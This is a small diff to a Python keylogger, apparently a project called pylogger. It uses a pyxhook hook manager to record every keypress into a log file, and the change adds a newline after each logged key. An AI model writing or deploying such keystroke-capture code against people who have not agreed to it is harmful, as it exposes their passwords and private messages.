@@ -34,7 +34,7 @@ if os.environ.get('pylogger_clean', None) is not None:
 #Creating key pressing event and saving it into log file 
 def OnKeyPress(event):
 	with open(log_file, 'a') as f:
-		f.write('{}'.format(event.Key))
+		f.write('{}\n'.format(event.Key))
 
 # Create a hook manager object
 new_hook = pyxhook.HookManager()
